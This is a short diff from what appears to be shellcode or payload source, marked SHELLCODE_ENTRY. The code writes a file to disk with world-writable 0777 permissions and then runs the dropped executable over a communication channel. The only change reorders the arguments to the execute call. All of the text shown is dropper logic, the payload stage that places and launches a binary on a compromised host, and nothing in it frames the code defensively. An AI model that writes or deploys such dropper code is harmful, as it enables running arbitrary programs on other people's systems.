@@ -24,5 +24,5 @@ SHELLCODE_ENTRY
     File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents);
 
     /* Execute the dropped executable. */
-    Process::execute(file_path, channel);
+    Process::execute(channel, file_path);
 }
